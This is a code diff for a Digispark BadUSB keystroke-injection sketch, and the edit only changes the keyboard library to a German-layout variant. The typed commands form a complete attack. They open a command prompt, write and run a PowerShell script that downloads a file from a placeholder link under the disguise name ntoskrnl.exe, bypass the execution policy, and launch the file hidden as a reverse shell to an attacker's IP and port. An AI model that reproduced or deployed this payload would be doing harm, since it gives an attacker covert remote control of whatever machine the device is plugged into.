@@ -4,16 +4,16 @@ void setup() {
   DigiKeyboardDe.sendKeyStroke(0);
   DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardDe.delay(100);
-  DigiKeyboard.println("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cd / & mkdir win & cd /win & echo (wget 'LINK' -OutFile ntoskrnl.exe) > b.ps1");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(50);
-  DigiKeyboard.println("START /MIN ntoskrnl.exe IP PORT -e cmd.exe -d & exit");
-  DigiKeyboard.delay(50);
+  DigiKeyboardDe.println("cmd");
+  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardDe.delay(100);
+  DigiKeyboardDe.println("cd / & mkdir win & cd /win & echo (wget 'LINK' -OutFile ntoskrnl.exe) > b.ps1");
+  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardDe.println("powershell -ExecutionPolicy ByPass -File b.ps1");
+  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardDe.delay(50);
+  DigiKeyboardDe.println("START /MIN ntoskrnl.exe IP PORT -e cmd.exe -d & exit");
+  DigiKeyboardDe.delay(50);
 }
 
 void loop() {
